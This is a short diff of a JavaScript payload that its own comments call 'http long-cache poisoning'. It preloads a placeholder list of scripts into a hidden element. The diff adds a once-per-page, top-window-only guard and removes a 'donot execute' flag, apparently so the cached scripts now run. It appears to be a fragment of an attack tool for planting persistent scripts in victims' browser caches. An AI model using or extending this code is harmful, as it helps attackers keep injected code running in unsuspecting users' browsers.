@@ -1,6 +1,12 @@
 (function() {
+	if (window._$AD_ || top != window) {
+		return;
+	}
+	window._$AD_ = true;
+
+
 	// ==================================================
-	// http cache poisoning
+	// http long-cache poisoning
 	// ==================================================
 	var arr = '$LIST'.split('|');
 	var box;
@@ -20,7 +26,6 @@
 	}
 
 	function preloadJs() {
-		Date.T = true;	// flag: donot execute
 		box = document.createElement('div');
 		document.body.appendChild(box);
 		loadNext();
